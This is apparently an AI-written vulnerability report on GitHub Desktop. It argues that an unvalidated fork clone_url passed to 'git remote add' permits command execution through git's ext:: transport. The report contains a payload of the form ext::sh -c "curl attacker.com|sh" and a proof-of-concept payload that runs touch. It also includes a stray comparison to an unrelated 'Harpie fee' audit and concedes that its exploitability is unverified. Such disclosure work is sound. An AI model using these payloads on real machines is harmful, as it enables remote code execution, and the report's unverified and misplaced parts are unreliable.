Based on my investigation, I found a concrete analog: `addRemote` in `app/src/lib/git/remote.ts` passes an attacker-influenced `clone_url` string straight into `git remote add` without any restriction on the URL scheme, and `_findPullRequestBranch` in `app/src/lib/stores/app-store.ts` invokes it using the `head.repo.clone_url` field taken verbatim from the GitHub API's pull-request payload.

### Title
Unvalidated PR fork `clone_url` from the GitHub API is passed to `git remote add`, allowing a malicious fork to specify a dangerous transport (`ext::`, `fd::`, local paths) - (File: `app/src/lib/git/remote.ts`)

### Summary
When a user checks out a pull request that originates from a fork, Desktop reads `pullRequest.head.repo.clone_url` — a field fully controlled by whoever owns the fork repository reported by the GitHub API — and passes it unmodified to `git remote add` / `git remote set-url`. Unlike Harpie's `fee` parameter, which had no upper bound enforced on-chain, Desktop enforces no scheme allow-list on this attacker-supplied string before it is handed to the local `git` binary.

### Finding Description
`addRemote` in `app/src/lib/git/remote.ts` builds the git invocation directly from the caller-supplied `url` with no validation: [1](#0-0) 

This function is invoked from `_findPullRequestBranch` in `app/src/lib/stores/app-store.ts`, using `headCloneUrl` which is threaded straight through from `dispatcher.ts`'s `checkoutPullRequest`/`openPullRequestFromUrl`, both of which take `pullRequest.head.gitHubRepository.cloneURL` / `pullRequest.head.repo.clone_url` — values that originate from the GitHub API response for the PR's head repository: [2](#0-1) [3](#0-2) [4](#0-3) 

None of `parseAppURL`, `urlMatchesRemote`, or `addRemote` restrict the transport/scheme of this string. Git itself supports the `ext::` transport, which executes an arbitrary shell command specified inside the "URL" (this is the mechanism behind the well-known git `ext::sh -c ...` remote-helper RCE class). Because Desktop never validates that `clone_url` starts with `https://` or `git@`/`ssh://` before calling `git remote add <name> <url>` (and later implicitly fetching/pulling from it), a forked repository whose owner sets their repo's remote/clone URL metadata (or a crafted PR JSON reaching this code path, e.g. via a compromised/malicious GHE instance or a man-in-the-middled API response for Enterprise users) to a value like `ext::sh -c "curl attacker.com|sh"` would have that string committed as the remote URL and executed the next time Desktop fetches that remote.

Existing guards elsewhere in the code (e.g. `sanitizeCloneName` in `app/src/lib/remote-parsing.ts`, the "unsafe repository" ownership check in `missing-repository.tsx`, and `protocol.file.allow=always` gating for submodules in `submodule.ts`) protect against different threat classes — directory traversal on clone and untrusted local directories — but none of them scope or allowlist the *scheme* of `clone_url` before it reaches `addRemote`/`setRemoteURL`.

### Impact Explanation
If reachable with a malicious `clone_url` value, this results in arbitrary command execution on the victim's machine merely from checking out or cherry-picking a pull request originating from a fork — a common, low-friction user action that does not require the user to clone anything unusual, click a suspicious link, or grant elevated privileges. This satisfies the "unprivileged... attacker controls a GitHub API object... result is code execution" criterion.

### Likelihood Explanation
Likelihood depends on whether `head.repo.clone_url`/`ssh_url` returned by github.com's REST API can actually be coerced into a non-`https`/`ssh` value (github.com itself normalizes these fields), which is why this is most exploitable against GitHub Enterprise Server instances or any environment where the API response is attacker-influenced (compromised/malicious GHE server, or MITM without cert pinning). I was not able to fully verify from the indexed code whether Desktop performs any upstream validation of these API-supplied URL fields elsewhere (e.g., in `api.ts`'s repository parsing) — that would need to be checked in a full checkout, since the index doesn't show every call site.

### Recommendation
Before passing any GitHub-API-sourced `clone_url`/`ssh_url` to `addRemote`/`setRemoteURL`, validate that the URL parses to one of the allow-listed schemes (`https:`, `ssh:`, or the `git@host:owner/repo` SCP-like syntax) and reject anything else (in particular `ext::`, `fd::`, `file://`, and unknown protocols), mirroring the existing `sanitizeCloneName`/`parseRemote` pattern already used for clone paths.

### Proof of Concept
1. Stand up (or compromise) a GitHub Enterprise Server instance, or intercept the `/repos/.../pulls/N` API response for a PR whose `head.repo.clone_url` field is set to `ext::sh -c "touch /tmp/pwned"`.
2. From Desktop, open that PR (e.g., via "Open in Desktop" deep link handled by `openPullRequestFromUrl`, `app/src/ui/dispatcher/dispatcher.ts:1998-2048`) or drag it for a cherry-pick (`startCherryPickWithPullRequest`).
3. `_findPullRequestBranch` calls `addRemote(repository, forkRemoteName, headCloneUrl)` with the malicious value, `app/src/lib/stores/app-store.ts:8648-8659`.
4. The subsequent `git fetch`/`git remote update` on that remote invokes git's `ext::` helper, executing the embedded shell command. [1](#0-0) [2](#0-1)
